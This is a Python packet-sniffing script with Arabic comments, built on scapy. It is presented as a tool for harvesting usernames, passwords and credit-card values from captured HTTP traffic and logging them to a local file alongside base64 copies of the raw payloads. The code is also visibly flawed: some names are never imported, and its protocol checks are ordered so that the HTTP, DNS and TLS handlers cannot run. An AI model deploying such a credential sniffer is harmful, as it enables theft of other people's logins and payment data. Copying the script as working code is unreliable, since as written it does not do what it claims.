from scapy.all import sniff, TCP, UDP, IP, Raw, DNS, ARP, Ether, TLS  # استيراد البروتوكولات الأساسية
from scapy.layers.http import HTTPRequest  # استيراد طبقة HTTPRequest بعد تثبيت scapy_http
from datetime import datetime
import base64
import re
import json

# إحصائيات الحزم الملتقطة لكل بروتوكول
packet_stats = {
    "TCP": 0,
    "UDP": 0,
    "ICMP": 0,
    "ARP": 0,
    "HTTP": 0,
    "DNS": 0,
    "TLS": 0,
    "Other": 0
}

# دالة لتحليل الحزم وطباعتها
def sn(pk):
    packet_type = "Unknown"
    
    # تحديد البروتوكول الرئيسي للحزمة
    if pk.haslayer(TCP):
        packet_type = "TCP"
    elif pk.haslayer(UDP):
        packet_type = "UDP"
    elif pk.haslayer(HTTPRequest):  # HTTP packet
        packet_type = "HTTP"
        handle_http(pk)
    elif pk.haslayer(DNS):  # DNS packet
        packet_type = "DNS"
        handle_dns(pk)
    elif pk.haslayer(ARP):  # ARP packet
        packet_type = "ARP"
        handle_arp(pk)
    elif pk.haslayer(TLS):  # TLS packet
        packet_type = "TLS"
        handle_tls(pk)
    
    # تحديث إحصائيات البروتوكولات
    packet_stats[packet_type] = packet_stats.get(packet_type, 0) + 1

    # طباعة الحزم غير المعروفة
    if packet_type == "Unknown":
        print("Unknown Packet Type")
        hexdump(pk)

# دوال لتحليل الحزم المتنوعة

def handle_http(pk):
    """تحليل حزمة HTTP"""
    print("################################")
    print("HTTP Request Captured")
    print(f"Host: {pk[HTTPRequest].Host.decode()}")
    print(f"Path: {pk[HTTPRequest].Path.decode()}")
    print(f"Method: {pk[HTTPRequest].Method.decode()}")
    
    # إذا كانت الحزمة تحتوي على بيانات خام
    if pk.haslayer(Raw):
        raw_data = pk[Raw].load.decode(errors="ignore")  # فك تشفير البيانات الخام
        print(f"Raw Data: {raw_data}")
        
        # البحث عن بيانات حساسة مثل username و password باستخدام عبارات regular expressions
        username = extract_sensitive_info(raw_data, 'username')
        password = extract_sensitive_info(raw_data, 'password')
        credit_card = extract_sensitive_info(raw_data, 'card')

        if username or password or credit_card:
            print(f"Username: {username}")
            print(f"Password: {password}")
            print(f"Credit Card Info: {credit_card}")
            log_sensitive_data(username, password, credit_card, raw_data)  # تسجيل البيانات الحساسة

def handle_dns(pk):
    """تحليل حزمة DNS"""
    print("################################")
    print("DNS Request Captured")
    if pk.haslayer(DNS) and pk[DNS].qd:
        print(f"DNS Query for: {pk[DNS].qd.qname.decode()}")

def handle_arp(pk):
    """تحليل حزمة ARP"""
    print("################################")
    print("ARP Packet Captured")
    print(f"Source MAC: {pk[ARP].hwsrc}")
    print(f"Destination MAC: {pk[ARP].hwdst}")

def handle_tls(pk):
    """تحليل حزمة TLS"""
    print("################################")
    print("TLS Packet Captured")
    if pk.haslayer(Raw):
        tls_data = pk[Raw].load
        print(f"TLS Raw Data (hex): {tls_data.hex()}")

# دالة لاستخراج البيانات الحساسة باستخدام regular expressions
def extract_sensitive_info(raw_data, field_name):
    """
    تبحث عن قيم الحقول الحساسة مثل username و password و card.
    """
    pattern = re.compile(rf"{field_name}=([^\s&]+)", re.IGNORECASE)
    match = pattern.search(raw_data)
    if match:
        return match.group(1)  # القيمة الخاصة بالحقل
    return None

# دالة لتسجيل البيانات الحساسة المكتشفة
def log_sensitive_data(username, password, credit_card, raw_data):
    with open("sensitive_data_log.txt", "a") as f:
        f.write(f"Sensitive Data Captured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        if username:
            f.write(f"Username: {username}\n")
        if password:
            f.write(f"Password: {password}\n")
        if credit_card:
            f.write(f"Credit Card Info: {credit_card}\n")
        encoded_data = base64.b64encode(raw_data.encode()).decode()  # تشفير بسيط للبيانات
        f.write(f"Raw Data (Base64): {encoded_data}\n")
        f.write("################################\n\n")

# طباعة الإحصائيات بعد انتهاء الالتقاط
def print_stats():
    print("\n##### Packet Statistics #####")
    for protocol, count in packet_stats.items():
        print(f"{protocol}: {count} packets")
    print("#############################")

# التقاط الحزم مع دعم الفلاتر
def start_sniffer_background(iface="Wi-Fi", filter=None, count=0):
    try:
        print(f"Starting sniffer on interface: {iface}")
        sniff(iface=iface, prn=sn, filter=filter, count=count)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        print_stats()

# مثال على تشغيل الـ sniffer مع إضافة فلتر لحزم TCP وHTTP و DNS
start_sniffer_background(iface="Wi-Fi", filter="tcp or udp or port 53 or port 443 or port 80", count=1000)
